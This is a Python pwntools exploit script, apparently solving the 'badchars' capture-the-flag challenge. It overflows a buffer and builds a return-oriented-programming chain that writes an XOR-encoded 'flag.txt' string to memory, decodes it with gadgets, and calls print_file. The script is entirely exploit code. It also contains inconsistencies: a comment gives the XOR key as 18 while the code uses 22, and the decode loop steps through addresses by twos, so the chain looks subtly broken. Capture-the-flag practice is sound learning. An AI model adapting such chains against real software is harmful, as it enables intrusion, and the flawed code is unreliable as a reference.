#!/usr/bin/env python3
from pwn import *
context.update(arch='amd64', os='linux')
exe = context.binary = ELF('./badchars')
r = ROP(exe)
io = process('./badchars')
for i in range(4):
    print(io.recvline().decode('utf-8').strip('\n'))
print(io.recv(4))
rop = b'a'*40
# Load registers
# pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
rop += p64(0x40069c)
#Output from helper script - flag.txt xored with 18
rop += p64(0x707a777138626e62, endianness="big")
#Write start address
rop += p64(0x600e00)
#mov qword ptr [r13], r12 ; ret
rop += p64(0x400634)
for i in range(8):
    #pop r14 ; pop r15 ; ret
    rop += p64(0x4006a0)
    rop += p64(22)
    #Write start address+i
    rop += p64(0x600e00+i*2)
    #xor byte ptr [r15], r14b ; ret
    rop += p64(0x400628)
#pop rdi ; ret
rop += p64(0x4006a3)
#Write start address
rop += p64(0x600e00)
r.call(exe.sym.plt.print_file, [0x600e00])
#print_file address
rop += r.chain()
io.sendline(rop)
io.interactive()